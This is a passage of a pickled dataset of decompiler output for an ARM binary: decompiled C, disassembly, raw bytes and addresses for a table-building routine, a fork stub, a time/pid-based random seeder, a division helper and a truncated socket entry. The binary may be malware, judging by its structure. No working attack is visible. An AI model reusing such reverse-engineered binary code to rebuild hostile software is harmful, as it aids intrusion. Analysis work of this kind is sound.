S'stmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 lr }\nmov r0,#0x21\nbl 0x00008914\nldr r4,[0xab6c]\nldr r1,[0xab70]\nmov r2,#0x21\ncpy r5,r0\nbl 0x0000ac64\nmov r2,#0x21\nmov r0,#0x6\nstr r5,[r4,#0x18]\nstrh r2,[r4,#0x1c]\nbl 0x00008914\nldr r1,[0xab74]\nmov r2,#0x6\nmov r7,#0x6\ncpy r5,r0\nbl 0x0000ac64\nmov r0,#0x7\ncpy r8,r0\nstr r5,[r4,#0x20]\nstrh r7,[r4,#0x24]\nbl 0x00008914\nldr r1,[0xab78]\ncpy r2,r8\ncpy r5,r0\nbl 0x0000ac64\ncpy r0,r8\nstr r5,[r4,#0x28]\nstrh r8,[r4,#0x2c]\nbl 0x00008914\nldr r1,[0xab7c]\ncpy r2,r8\ncpy r5,r0\nbl 0x0000ac64\nmov r0,#0x3\nstr r5,[r4,#0x30]\nstrh r8,[r4,#0x34]\nbl 0x00008914\nldr r1,[0xab80]\nmov r2,#0x3\ncpy r5,r0\nbl 0x0000ac64\nmov r3,#0x3\nmov r0,#0x14\nstrh r3,[r4,#0x3c]\nstr r5,[r4,#0x38]\nbl 0x00008914\nldr r1,[0xab84]\nmov r2,#0x14\ncpy r5,r0\nbl 0x0000ac64\nmov r2,#0x14\nmov r0,#0x19\nstr r5,[r4,#0x40]\nstrh r2,[r4,#0x44]\nbl 0x00008914\nldr r1,[0xab88]\nmov r2,#0x19\ncpy r5,r0\nbl 0x0000ac64\nmov r3,#0x19\nmov r0,#0x9\nstrh r3,[r4,#0x4c]\nstr r5,[r4,#0x48]\nbl 0x00008914\nldr r1,[0xab8c]\nmov r2,#0x9\ncpy r5,r0\nbl 0x0000ac64\nmov r2,#0x9\nmov r0,#0x10\nstr r5,[r4,#0x50]\nstrh r2,[r4,#0x54]\nbl 0x00008914\nldr r1,[0xab90]\nmov r2,#0x10\ncpy r5,r0\nbl 0x0000ac64\nmov r3,#0x10\nmov r0,#0x16\nstrh r3,[r4,#0x5c]\nstr r5,[r4,#0x58]\nbl 0x00008914\nldr r1,[0xab94]\nmov r2,#0x16\ncpy r5,r0\nbl 0x0000ac64\nmov r2,#0x16\nmov r0,#0x5\nstr r5,[r4,#0x60]\nstrh r2,[r4,#0x64]\nbl 0x00008914\nldr r1,[0xab98]\nmov r2,#0x5\nmov r5,#0x5\ncpy r6,r0\nbl 0x0000ac64\ncpy r0,r7\nstr r6,[r4,#0x68]\nstrh r5,[r4,#0x6c]\nbl 0x00008914\ncpy r2,r7\nldr r1,[0xab9c]\ncpy r6,r0\nbl 0x0000ac64\nmov r0,#0x8\nstr r6,[r4,#0x70]\nstrh r7,[r4,#0x74]\nbl 0x00008914\nldr r1,[0xaba0]\nmov r2,#0x8\ncpy r6,r0\nmov r9,#0x8\nbl 0x0000ac64\ncpy r0,r8\nstr r6,[r4,#0x78]\nstrh r9,[r4,#0x7c]\nbl 0x00008914\nldr r1,[0xaba4]\ncpy r2,r8\ncpy r6,r0\nbl 0x0000ac64\ncpy r0,r5\nstr r6,[r4,#0x80]\nstrh r8,[r4,#0x84]\nbl 0x00008914\ncpy r2,r5\nldr r1,[0xaba8]\ncpy r6,r0\nbl 0x0000ac64\nmov r0,#0x4\nstr r6,[r4,#0x88]\nstrh r5,[r4,#0x8c]\nbl 0x00008914\nldr r1,[0xabac]\nmov r2,#0x4\ncpy r6,r0\nbl 0x0000ac64\nmov r3,#0x4\ncpy r0,r7\nstrh r3,[r4,#0x94]\nstr r6,[r4,#0x90]\nbl 0x00008914\ncpy r2,r7\nldr r1,[0xabb0]\ncpy r6,r0\nbl 0x0000ac64\nmov r0,#0xe\nstr r6,[r4,#0x98]\nstrh r7,[r4,#0x9c]\nbl 0x00008914\nldr r1,[0xabb4]\nmov r2,#0xe\ncpy r6,r0\nmov r10,#0xe\nbl 0x0000ac64\nmov r0,#0xa\nstr r6,[r4,#0xa0]\nstrh r10,[r4,#0xa4]\nbl 0x00008914\nldr r1,[0xabb8]\nmov r2,#0xa\nmov r6,#0xa\ncpy r7,r0\nbl 0x0000ac64\ncpy r0,r8\nstr r7,[r4,#0xa8]\nstrh r6,[r4,#0xac]\nbl 0x00008914\nldr r1,[0xabbc]\ncpy r2,r8\ncpy r7,r0\nbl 0x0000ac64\ncpy r0,r5\nstr r7,[r4,#0xb0]\nstrh r8,[r4,#0xb4]\nbl 0x00008914\ncpy r2,r5\nldr r1,[0xabc0]\ncpy r7,r0\nbl 0x0000ac64\ncpy r0,r5\nstr r7,[r4,#0xb8]\nstrh r5,[r4,#0xbc]\nbl 0x00008914\ncpy r2,r5\nldr r1,[0xabc4]\ncpy r7,r0\nbl 0x0000ac64\ncpy r0,r5\nstr r7,[r4,#0xc0]\nstrh r5,[r4,#0xc4]\nbl 0x00008914\ncpy r2,r5\nldr r1,[0xabc8]\ncpy r7,r0\nbl 0x0000ac64\ncpy r0,r9\nstrh r5,[r4,#0xcc]\nstr r7,[r4,#0xc8]\nbl 0x00008914\nldr r1,[0xabcc]\ncpy r2,r9\ncpy r5,r0\nbl 0x0000ac64\ncpy r0,r6\nstr r5,[r4,#0xd8]\nstrh r9,[r4,#0xdc]\nbl 0x00008914\nldr r1,[0xabd0]\ncpy r2,r6\ncpy r5,r0\nbl 0x0000ac64\ncpy r0,r6\nstr r5,[r4,#0xd0]\nstrh r6,[r4,#0xd4]\nbl 0x00008914\nldr r1,[0xabd4]\ncpy r2,r6\ncpy r5,r0\nbl 0x0000ac64\ncpy r0,r10\nstr r5,[r4,#0xe0]\nstrh r6,[r4,#0xe4]\nbl 0x00008914\nldr r1,[0xabd8]\ncpy r2,r10\ncpy r5,r0\nbl 0x0000ac64\nmov r0,#0x13\nstr r5,[r4,#0xe8]\nstrh r10,[r4,#0xec]\nbl 0x00008914\nldr r1,[0xabdc]\nmov r2,#0x13\ncpy r5,r0\nbl 0x0000ac64\nmov r2,#0x13\nmov r0,#0x17\nstr r5,[r4,#0xf0]\nstrh r2,[r4,#0xf4]\nbl 0x00008914\nldr r1,[0xabe0]\nmov r2,#0x17\ncpy r5,r0\nbl 0x0000ac64\nmov r3,#0x17\nmov r0,#0x18\nstrh r3,[r4,#0xfc]\nstr r5,[r4,#0xf8]\nbl 0x00008914\nldr r1,[0xabe4]\nmov r2,#0x18\ncpy r5,r0\nbl 0x0000ac64\nmov r3,#0x104\nmov r2,#0x18\nmov r0,#0x30\nstrh r2,[r4,r3]\nstr r5,[r4,#0x100]\nbl 0x00008914\nldr r1,[0xabe8]\nmov r2,#0x30\ncpy r5,r0\nbl 0x0000ac64\nmov r3,#0x10c\nmov r2,#0x30\nmov r0,#0x11\nstrh r2,[r4,r3]\nstr r5,[r4,#0x108]\nbl 0x00008914\nldr r1,[0xabec]\nmov r2,#0x11\ncpy r5,r0\nbl 0x0000ac64\nmov r3,#0x11c\nmov r2,#0x11\nmov r0,#0xb\nstrh r2,[r4,r3]\nstr r5,[r4,#0x118]\nbl 0x00008914\nmov r2,#0xb\nldr r1,[0xabf0]\ncpy r5,r0\nbl 0x0000ac64\nmov r3,#0x124\nmov r2,#0xb\nstr r5,[r4,#0x120]\nstrh r2,[r4,r3]\nldmia sp!,{ r4 r5 r6 r7 r8 r9 r10 lr }\nbx lr\n'
p424
S'f0 47 2d e9\n21 00 a0 e3\n8a f8 ff eb\n7c 44 9f e5\n7c 14 9f e5\n21 20 a0 e3\n00 50 a0 e1\n59 01 00 eb\n21 20 a0 e3\n06 00 a0 e3\n18 50 84 e5\nbc 21 c4 e1\n80 f8 ff eb\n5c 14 9f e5\n06 20 a0 e3\n06 70 a0 e3\n00 50 a0 e1\n4f 01 00 eb\n07 00 a0 e3\n00 80 a0 e1\n20 50 84 e5\nb4 72 c4 e1\n76 f8 ff eb\n38 14 9f e5\n08 20 a0 e1\n00 50 a0 e1\n46 01 00 eb\n08 00 a0 e1\n28 50 84 e5\nbc 82 c4 e1\n6e f8 ff eb\n1c 14 9f e5\n08 20 a0 e1\n00 50 a0 e1\n3e 01 00 eb\n03 00 a0 e3\n30 50 84 e5\nb4 83 c4 e1\n66 f8 ff eb\n00 14 9f e5\n03 20 a0 e3\n00 50 a0 e1\n36 01 00 eb\n03 30 a0 e3\n14 00 a0 e3\nbc 33 c4 e1\n38 50 84 e5\n5d f8 ff eb\ne0 13 9f e5\n14 20 a0 e3\n00 50 a0 e1\n2d 01 00 eb\n14 20 a0 e3\n19 00 a0 e3\n40 50 84 e5\nb4 24 c4 e1\n54 f8 ff eb\nc0 13 9f e5\n19 20 a0 e3\n00 50 a0 e1\n24 01 00 eb\n19 30 a0 e3\n09 00 a0 e3\nbc 34 c4 e1\n48 50 84 e5\n4b f8 ff eb\na0 13 9f e5\n09 20 a0 e3\n00 50 a0 e1\n1b 01 00 eb\n09 20 a0 e3\n10 00 a0 e3\n50 50 84 e5\nb4 25 c4 e1\n42 f8 ff eb\n80 13 9f e5\n10 20 a0 e3\n00 50 a0 e1\n12 01 00 eb\n10 30 a0 e3\n16 00 a0 e3\nbc 35 c4 e1\n58 50 84 e5\n39 f8 ff eb\n60 13 9f e5\n16 20 a0 e3\n00 50 a0 e1\n09 01 00 eb\n16 20 a0 e3\n05 00 a0 e3\n60 50 84 e5\nb4 26 c4 e1\n30 f8 ff eb\n40 13 9f e5\n05 20 a0 e3\n05 50 a0 e3\n00 60 a0 e1\nff 00 00 eb\n07 00 a0 e1\n68 60 84 e5\nbc 56 c4 e1\n27 f8 ff eb\n07 20 a0 e1\n1c 13 9f e5\n00 60 a0 e1\nf7 00 00 eb\n08 00 a0 e3\n70 60 84 e5\nb4 77 c4 e1\n1f f8 ff eb\n04 13 9f e5\n08 20 a0 e3\n00 60 a0 e1\n08 90 a0 e3\nee 00 00 eb\n08 00 a0 e1\n78 60 84 e5\nbc 97 c4 e1\n16 f8 ff eb\ne4 12 9f e5\n08 20 a0 e1\n00 60 a0 e1\ne6 00 00 eb\n05 00 a0 e1\n80 60 84 e5\nb4 88 c4 e1\n0e f8 ff eb\n05 20 a0 e1\nc4 12 9f e5\n00 60 a0 e1\nde 00 00 eb\n04 00 a0 e3\n88 60 84 e5\nbc 58 c4 e1\n06 f8 ff eb\nac 12 9f e5\n04 20 a0 e3\n00 60 a0 e1\nd6 00 00 eb\n04 30 a0 e3\n07 00 a0 e1\nb4 39 c4 e1\n90 60 84 e5\nfd f7 ff eb\n07 20 a0 e1\n88 12 9f e5\n00 60 a0 e1\ncd 00 00 eb\n0e 00 a0 e3\n98 60 84 e5\nbc 79 c4 e1\nf5 f7 ff eb\n70 12 9f e5\n0e 20 a0 e3\n00 60 a0 e1\n0e a0 a0 e3\nc4 00 00 eb\n0a 00 a0 e3\na0 60 84 e5\nb4 aa c4 e1\nec f7 ff eb\n50 12 9f e5\n0a 20 a0 e3\n0a 60 a0 e3\n00 70 a0 e1\nbb 00 00 eb\n08 00 a0 e1\na8 70 84 e5\nbc 6a c4 e1\ne3 f7 ff eb\n30 12 9f e5\n08 20 a0 e1\n00 70 a0 e1\nb3 00 00 eb\n05 00 a0 e1\nb0 70 84 e5\nb4 8b c4 e1\ndb f7 ff eb\n05 20 a0 e1\n10 12 9f e5\n00 70 a0 e1\nab 00 00 eb\n05 00 a0 e1\nb8 70 84 e5\nbc 5b c4 e1\nd3 f7 ff eb\n05 20 a0 e1\nf4 11 9f e5\n00 70 a0 e1\na3 00 00 eb\n05 00 a0 e1\nc0 70 84 e5\nb4 5c c4 e1\ncb f7 ff eb\n05 20 a0 e1\nd8 11 9f e5\n00 70 a0 e1\n9b 00 00 eb\n09 00 a0 e1\nbc 5c c4 e1\nc8 70 84 e5\nc3 f7 ff eb\nc0 11 9f e5\n09 20 a0 e1\n00 50 a0 e1\n93 00 00 eb\n06 00 a0 e1\nd8 50 84 e5\nbc 9d c4 e1\nbb f7 ff eb\na4 11 9f e5\n06 20 a0 e1\n00 50 a0 e1\n8b 00 00 eb\n06 00 a0 e1\nd0 50 84 e5\nb4 6d c4 e1\nb3 f7 ff eb\n88 11 9f e5\n06 20 a0 e1\n00 50 a0 e1\n83 00 00 eb\n0a 00 a0 e1\ne0 50 84 e5\nb4 6e c4 e1\nab f7 ff eb\n6c 11 9f e5\n0a 20 a0 e1\n00 50 a0 e1\n7b 00 00 eb\n13 00 a0 e3\ne8 50 84 e5\nbc ae c4 e1\na3 f7 ff eb\n50 11 9f e5\n13 20 a0 e3\n00 50 a0 e1\n73 00 00 eb\n13 20 a0 e3\n17 00 a0 e3\nf0 50 84 e5\nb4 2f c4 e1\n9a f7 ff eb\n30 11 9f e5\n17 20 a0 e3\n00 50 a0 e1\n6a 00 00 eb\n17 30 a0 e3\n18 00 a0 e3\nbc 3f c4 e1\nf8 50 84 e5\n91 f7 ff eb\n10 11 9f e5\n18 20 a0 e3\n00 50 a0 e1\n61 00 00 eb\n41 3f a0 e3\n18 20 a0 e3\n30 00 a0 e3\nb3 20 84 e1\n00 51 84 e5\n87 f7 ff eb\nec 10 9f e5\n30 20 a0 e3\n00 50 a0 e1\n57 00 00 eb\n43 3f a0 e3\n30 20 a0 e3\n11 00 a0 e3\nb3 20 84 e1\n08 51 84 e5\n7d f7 ff eb\nc8 10 9f e5\n11 20 a0 e3\n00 50 a0 e1\n4d 00 00 eb\n47 3f a0 e3\n11 20 a0 e3\n0b 00 a0 e3\nb3 20 84 e1\n18 51 84 e5\n73 f7 ff eb\n0b 20 a0 e3\na0 10 9f e5\n00 50 a0 e1\n43 00 00 eb\n49 3f a0 e3\n0b 20 a0 e3\n20 51 84 e5\nb3 20 84 e1\nf0 47 bd e8\n1e ff 2f e1\n'
p425
S'.text:0000a6dc\n.text:0000a6e0\n.text:0000a6e4\n.text:0000a6e8\n.text:0000a6ec\n.text:0000a6f0\n.text:0000a6f4\n.text:0000a6f8\n.text:0000a6fc\n.text:0000a700\n.text:0000a704\n.text:0000a708\n.text:0000a70c\n.text:0000a710\n.text:0000a714\n.text:0000a718\n.text:0000a71c\n.text:0000a720\n.text:0000a724\n.text:0000a728\n.text:0000a72c\n.text:0000a730\n.text:0000a734\n.text:0000a738\n.text:0000a73c\n.text:0000a740\n.text:0000a744\n.text:0000a748\n.text:0000a74c\n.text:0000a750\n.text:0000a754\n.text:0000a758\n.text:0000a75c\n.text:0000a760\n.text:0000a764\n.text:0000a768\n.text:0000a76c\n.text:0000a770\n.text:0000a774\n.text:0000a778\n.text:0000a77c\n.text:0000a780\n.text:0000a784\n.text:0000a788\n.text:0000a78c\n.text:0000a790\n.text:0000a794\n.text:0000a798\n.text:0000a79c\n.text:0000a7a0\n.text:0000a7a4\n.text:0000a7a8\n.text:0000a7ac\n.text:0000a7b0\n.text:0000a7b4\n.text:0000a7b8\n.text:0000a7bc\n.text:0000a7c0\n.text:0000a7c4\n.text:0000a7c8\n.text:0000a7cc\n.text:0000a7d0\n.text:0000a7d4\n.text:0000a7d8\n.text:0000a7dc\n.text:0000a7e0\n.text:0000a7e4\n.text:0000a7e8\n.text:0000a7ec\n.text:0000a7f0\n.text:0000a7f4\n.text:0000a7f8\n.text:0000a7fc\n.text:0000a800\n.text:0000a804\n.text:0000a808\n.text:0000a80c\n.text:0000a810\n.text:0000a814\n.text:0000a818\n.text:0000a81c\n.text:0000a820\n.text:0000a824\n.text:0000a828\n.text:0000a82c\n.text:0000a830\n.text:0000a834\n.text:0000a838\n.text:0000a83c\n.text:0000a840\n.text:0000a844\n.text:0000a848\n.text:0000a84c\n.text:0000a850\n.text:0000a854\n.text:0000a858\n.text:0000a85c\n.text:0000a860\n.text:0000a864\n.text:0000a868\n.text:0000a86c\n.text:0000a870\n.text:0000a874\n.text:0000a878\n.text:0000a87c\n.text:0000a880\n.text:0000a884\n.text:0000a888\n.text:0000a88c\n.text:0000a890\n.text:0000a894\n.text:0000a898\n.text:0000a89c\n.text:0000a8a0\n.text:0000a8a4\n.text:0000a8a8\n.text:0000a8ac\n.text:0000a8b0\n.text:0000a8b4\n.text:0000a8b8\n.text:0000a8bc\n.text:0000a8c0\n.text:0000a8c4\n.text:0000a8c8\n.text:0000a8cc\n.text:0000a8d0\n.text:0000a8d4\n.text:0000a8d8\n.text:0000a8dc\n.text:0000a8e0\n.text:0000a8e4\n.text:0000a8e8\n.text:0000a8ec\n.text:0000a8f0\n.text:0000a8f4\n.text:0000a8f8\n.text:0000a8fc\n.text:0000a900\n.text:0000a904\n.text:0000a908\n.text:0000a90c\n.text:0000a910\n.text:0000a914\n.text:0000a918\n.text:0000a91c\n.text:0000a920\n.text:0000a924\n.text:0000a928\n.text:0000a92c\n.text:0000a930\n.text:0000a934\n.text:0000a938\n.text:0000a93c\n.text:0000a940\n.text:0000a944\n.text:0000a948\n.text:0000a94c\n.text:0000a950\n.text:0000a954\n.text:0000a958\n.text:0000a95c\n.text:0000a960\n.text:0000a964\n.text:0000a968\n.text:0000a96c\n.text:0000a970\n.text:0000a974\n.text:0000a978\n.text:0000a97c\n.text:0000a980\n.text:0000a984\n.text:0000a988\n.text:0000a98c\n.text:0000a990\n.text:0000a994\n.text:0000a998\n.text:0000a99c\n.text:0000a9a0\n.text:0000a9a4\n.text:0000a9a8\n.text:0000a9ac\n.text:0000a9b0\n.text:0000a9b4\n.text:0000a9b8\n.text:0000a9bc\n.text:0000a9c0\n.text:0000a9c4\n.text:0000a9c8\n.text:0000a9cc\n.text:0000a9d0\n.text:0000a9d4\n.text:0000a9d8\n.text:0000a9dc\n.text:0000a9e0\n.text:0000a9e4\n.text:0000a9e8\n.text:0000a9ec\n.text:0000a9f0\n.text:0000a9f4\n.text:0000a9f8\n.text:0000a9fc\n.text:0000aa00\n.text:0000aa04\n.text:0000aa08\n.text:0000aa0c\n.text:0000aa10\n.text:0000aa14\n.text:0000aa18\n.text:0000aa1c\n.text:0000aa20\n.text:0000aa24\n.text:0000aa28\n.text:0000aa2c\n.text:0000aa30\n.text:0000aa34\n.text:0000aa38\n.text:0000aa3c\n.text:0000aa40\n.text:0000aa44\n.text:0000aa48\n.text:0000aa4c\n.text:0000aa50\n.text:0000aa54\n.text:0000aa58\n.text:0000aa5c\n.text:0000aa60\n.text:0000aa64\n.text:0000aa68\n.text:0000aa6c\n.text:0000aa70\n.text:0000aa74\n.text:0000aa78\n.text:0000aa7c\n.text:0000aa80\n.text:0000aa84\n.text:0000aa88\n.text:0000aa8c\n.text:0000aa90\n.text:0000aa94\n.text:0000aa98\n.text:0000aa9c\n.text:0000aaa0\n.text:0000aaa4\n.text:0000aaa8\n.text:0000aaac\n.text:0000aab0\n.text:0000aab4\n.text:0000aab8\n.text:0000aabc\n.text:0000aac0\n.text:0000aac4\n.text:0000aac8\n.text:0000aacc\n.text:0000aad0\n.text:0000aad4\n.text:0000aad8\n.text:0000aadc\n.text:0000aae0\n.text:0000aae4\n.text:0000aae8\n.text:0000aaec\n.text:0000aaf0\n.text:0000aaf4\n.text:0000aaf8\n.text:0000aafc\n.text:0000ab00\n.text:0000ab04\n.text:0000ab08\n.text:0000ab0c\n.text:0000ab10\n.text:0000ab14\n.text:0000ab18\n.text:0000ab1c\n.text:0000ab20\n.text:0000ab24\n.text:0000ab28\n.text:0000ab2c\n.text:0000ab30\n.text:0000ab34\n.text:0000ab38\n.text:0000ab3c\n.text:0000ab40\n.text:0000ab44\n.text:0000ab48\n.text:0000ab4c\n.text:0000ab50\n.text:0000ab54\n.text:0000ab58\n.text:0000ab5c\n.text:0000ab60\n.text:0000ab64\n.text:0000ab68\n'
p426
tp427
sS'fork'
p428
(S'\n__stdcall fork()\n'
p429
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000a__pid_t fork(void)\u000a\u000a{\u000a  __pid_t _Var1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089dc. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  _Var1 = (*(code *)PTR_LAB_000132e8)();\u000a  return _Var1;\u000a}\u000a\u000a
p430
S'adr r12,0x89dc\nadd r12,r12,#0xa000\nldr pc,[r12,#0x90c]!\n'
p431
S'00 c6 8f e2\n0a ca 8c e2\n0c f9 bc e5\n'
p432
S'.plt:000089d4\n.plt:000089d8\n.plt:000089dc\n'
p433
tp434
sS'FUN_0000a364'
p435
(S'\n__stdcall FUN_0000a364()\n'
p436
V\u000avoid FUN_0000a364(void)\u000a\u000a{\u000a  undefined *puVar1;\u000a  undefined *puVar2;\u000a  time_t tVar3;\u000a  uint uVar4;\u000a  uint uVar5;\u000a  \u000a  tVar3 = time((time_t *)0x0);\u000a  *(time_t *)PTR_DAT_0000a3bc = tVar3;\u000a  uVar4 = getpid();\u000a  uVar5 = getppid();\u000a  puVar1 = PTR_DAT_0000a3c0;\u000a  *(uint *)PTR_DAT_0000a3c0 = uVar5 ^ uVar4;\u000a  uVar4 = clock();\u000a  puVar2 = PTR_DAT_0000a3c8;\u000a  *(uint *)PTR_DAT_0000a3c4 = uVar4 ^ *(uint *)puVar1;\u000a  *(uint *)puVar2 = uVar4;\u000a  return;\u000a}\u000a\u000a
p437
S'stmdb sp!,{ r4 r5 lr }\nmov r0,#0x0\nsub sp,sp,#0x4\nbl 0x000089f8\nldr r3,[0xa3bc]\nstr r0,[r3,#0x0]\nbl 0x000088fc\ncpy r4,r0\nbl 0x000089ec\nldr r5,[0xa3c0]\neor r0,r0,r4\nstr r0,[r5,#0x0]\nbl 0x00008a34\nldr r3,[r5,#0x0]\nldr r2,[0xa3c4]\nldr r1,[0xa3c8]\neor r3,r0,r3\nstr r3,[r2,#0x0]\nstr r0,[r1,#0x0]\nadd sp,sp,#0x4\nldmia sp!,{ r4 r5 lr }\nbx lr\n'
p438
S'30 40 2d e9\n00 00 a0 e3\n04 d0 4d e2\na0 f9 ff eb\n40 30 9f e5\n00 00 83 e5\n5e f9 ff eb\n00 40 a0 e1\n98 f9 ff eb\n30 50 9f e5\n04 00 20 e0\n00 00 85 e5\na6 f9 ff eb\n00 30 95 e5\n20 20 9f e5\n20 10 9f e5\n03 30 20 e0\n00 30 82 e5\n00 00 81 e5\n04 d0 8d e2\n30 40 bd e8\n1e ff 2f e1\n'
p439
S'.text:0000a364\n.text:0000a368\n.text:0000a36c\n.text:0000a370\n.text:0000a374\n.text:0000a378\n.text:0000a37c\n.text:0000a380\n.text:0000a384\n.text:0000a388\n.text:0000a38c\n.text:0000a390\n.text:0000a394\n.text:0000a398\n.text:0000a39c\n.text:0000a3a0\n.text:0000a3a4\n.text:0000a3a8\n.text:0000a3ac\n.text:0000a3b0\n.text:0000a3b4\n.text:0000a3b8\n'
p440
tp441
sS'FUN_0000ae7c'
p442
(S'\n__stdcall FUN_0000ae7c()\n'
p443
V\u000auint FUN_0000ae7c(uint uParm1,uint uParm2)\u000a\u000a{\u000a  uint uVar1;\u000a  int iVar2;\u000a  uint uVar3;\u000a  bool bVar4;\u000a  \u000a  if (uParm2 - 1 == 0) {\u000a    return uParm1;\u000a  }\u000a  if (uParm2 == 0) {\u000a    FUN_0000af90();\u000a    return 0;\u000a  }\u000a  if (uParm1 <= uParm2) {\u000a    return (uint)(uParm1 == uParm2);\u000a  }\u000a  if ((uParm2 & uParm2 - 1) == 0) {\u000a    if (uParm2 < 0x10000) {\u000a      iVar2 = 0;\u000a    }\u000a    else {\u000a      uParm2 = uParm2 >> 0x10;\u000a      iVar2 = 0x10;\u000a    }\u000a    if (0xff < uParm2) {\u000a      uParm2 = uParm2 >> 8;\u000a      iVar2 = iVar2 + 8;\u000a    }\u000a    if (0xf < uParm2) {\u000a      uParm2 = uParm2 >> 4;\u000a      iVar2 = iVar2 + 4;\u000a    }\u000a    if (uParm2 < 5) {\u000a      uVar3 = iVar2 + (uParm2 >> 1);\u000a    }\u000a    else {\u000a      uVar3 = iVar2 + 3;\u000a    }\u000a    return uParm1 >> (uVar3 & 0xff);\u000a  }\u000a  if ((uParm2 & 0xe0000000) == 0) {\u000a    uParm2 = uParm2 << 3;\u000a    uVar3 = 8;\u000a  }\u000a  else {\u000a    uVar3 = 1;\u000a  }\u000a  while (uParm2 < 0x10000000 && uParm2 < uParm1) {\u000a    uParm2 = uParm2 << 4;\u000a    uVar3 = uVar3 << 4;\u000a  }\u000a  while (uParm2 < 0x80000000 && uParm2 < uParm1) {\u000a    uParm2 = uParm2 << 1;\u000a    uVar3 = uVar3 << 1;\u000a  }\u000a  uVar1 = 0;\u000a  while( true ) {\u000a    if (uParm2 <= uParm1) {\u000a      uParm1 = uParm1 - uParm2;\u000a      uVar1 = uVar1 | uVar3;\u000a    }\u000a    if (uParm2 >> 1 <= uParm1) {\u000a      uParm1 = uParm1 - (uParm2 >> 1);\u000a      uVar1 = uVar1 | uVar3 >> 1;\u000a    }\u000a    if (uParm2 >> 2 <= uParm1) {\u000a      uParm1 = uParm1 - (uParm2 >> 2);\u000a      uVar1 = uVar1 | uVar3 >> 2;\u000a    }\u000a    if (uParm2 >> 3 <= uParm1) {\u000a      uParm1 = uParm1 - (uParm2 >> 3);\u000a      uVar1 = uVar1 | uVar3 >> 3;\u000a    }\u000a    bVar4 = uParm1 == 0;\u000a    if (!bVar4) {\u000a      uVar3 = uVar3 >> 4;\u000a      bVar4 = uVar3 == 0;\u000a    }\u000a    if (bVar4) break;\u000a    uParm2 = uParm2 >> 4;\u000a  }\u000a  return uVar1;\u000a}\u000a\u000a
p444
S'subs r2,r1,#0x1\nbxeq lr\nbcc 0x0000af64\ncmp r0,r1\nbls 0x0000af1c\ntst r1,r2\nbeq 0x0000af28\ntst r1,#0xe0000000\nmoveq r1,r1, lsl #0x3\nmoveq r3,#0x8\nmovne r3,#0x1\ncmp r1,#0x10000000\ncmpcc r1,r0\nmovcc r1,r1, lsl #0x4\nmovcc r3,r3, lsl #0x4\nbcc 0x0000aea8\ncmp r1,#0x80000000\ncmpcc r1,r0\nmovcc r1,r1, lsl #0x1\nmovcc r3,r3, lsl #0x1\nbcc 0x0000aebc\nmov r2,#0x0\ncmp r0,r1\nsubcs r0,r0,r1\norrcs r2,r2,r3\ncmp r0,r1, lsr #0x1\nsubcs r0,r0,r1, lsr #0x1\norrcs r2,r2,r3, lsr #0x1\ncmp r0,r1, lsr #0x2\nsubcs r0,r0,r1, lsr #0x2\norrcs r2,r2,r3, lsr #0x2\ncmp r0,r1, lsr #0x3\nsubcs r0,r0,r1, lsr #0x3\norrcs r2,r2,r3, lsr #0x3\ncmp r0,#0x0\nmovnes r3,r3, lsr #0x4\nmovne r1,r1, lsr #0x4\nbne 0x0000aed4\ncpy r0,r2\nbx lr\nmoveq r0,#0x1\nmovne r0,#0x0\nbx lr\ncmp r1,#0x10000\nmovcs r1,r1, lsr #0x10\nmovcs r2,#0x10\nmovcc r2,#0x0\ncmp r1,#0x100\nmovcs r1,r1, lsr #0x8\naddcs r2,r2,#0x8\ncmp r1,#0x10\nmovcs r1,r1, lsr #0x4\naddcs r2,r2,#0x4\ncmp r1,#0x4\naddhi r2,r2,#0x3\naddls r2,r2,r1, lsr #0x1\nmov r0,r0, lsr r2\nbx lr\nstr lr,[sp,#-0x8]!\nbl 0x0000af90\nmov r0,#0x0\nldr lr,[sp],#0x8\nbx lr\n'
p445
S'01 20 51 e2\n1e ff 2f 01\n36 00 00 3a\n01 00 50 e1\n22 00 00 9a\n02 00 11 e1\n23 00 00 0a\n0e 02 11 e3\n81 11 a0 01\n08 30 a0 03\n01 30 a0 13\n01 02 51 e3\n00 00 51 31\n01 12 a0 31\n03 32 a0 31\nfa ff ff 3a\n02 01 51 e3\n00 00 51 31\n81 10 a0 31\n83 30 a0 31\nfa ff ff 3a\n00 20 a0 e3\n01 00 50 e1\n01 00 40 20\n03 20 82 21\na1 00 50 e1\na1 00 40 20\na3 20 82 21\n21 01 50 e1\n21 01 40 20\n23 21 82 21\na1 01 50 e1\na1 01 40 20\na3 21 82 21\n00 00 50 e3\n23 32 b0 11\n21 12 a0 11\nef ff ff 1a\n02 00 a0 e1\n1e ff 2f e1\n01 00 a0 03\n00 00 a0 13\n1e ff 2f e1\n01 08 51 e3\n21 18 a0 21\n10 20 a0 23\n00 20 a0 33\n01 0c 51 e3\n21 14 a0 21\n08 20 82 22\n10 00 51 e3\n21 12 a0 21\n04 20 82 22\n04 00 51 e3\n03 20 82 82\na1 20 82 90\n30 02 a0 e1\n1e ff 2f e1\n08 e0 2d e5\n08 00 00 eb\n00 00 a0 e3\n08 e0 9d e4\n1e ff 2f e1\n'
p446
S'.text:0000ae7c\n.text:0000ae80\n.text:0000ae84\n.text:0000ae88\n.text:0000ae8c\n.text:0000ae90\n.text:0000ae94\n.text:0000ae98\n.text:0000ae9c\n.text:0000aea0\n.text:0000aea4\n.text:0000aea8\n.text:0000aeac\n.text:0000aeb0\n.text:0000aeb4\n.text:0000aeb8\n.text:0000aebc\n.text:0000aec0\n.text:0000aec4\n.text:0000aec8\n.text:0000aecc\n.text:0000aed0\n.text:0000aed4\n.text:0000aed8\n.text:0000aedc\n.text:0000aee0\n.text:0000aee4\n.text:0000aee8\n.text:0000aeec\n.text:0000aef0\n.text:0000aef4\n.text:0000aef8\n.text:0000aefc\n.text:0000af00\n.text:0000af04\n.text:0000af08\n.text:0000af0c\n.text:0000af10\n.text:0000af14\n.text:0000af18\n.text:0000af1c\n.text:0000af20\n.text:0000af24\n.text:0000af28\n.text:0000af2c\n.text:0000af30\n.text:0000af34\n.text:0000af38\n.text:0000af3c\n.text:0000af40\n.text:0000af44\n.text:0000af48\n.text:0000af4c\n.text:0000af50\n.text:0000af54\n.text:0000af58\n.text:0000af5c\n.text:0000af60\n.text:0000af64\n.text:0000af68\n.text:0000af6c\n.text:0000af70\n.text:0000af74\n'
p447
tp448
sS'socket'
p449
(S'\n__stdcall socket(int __domain, int __type, int __protocol)\n'
p450
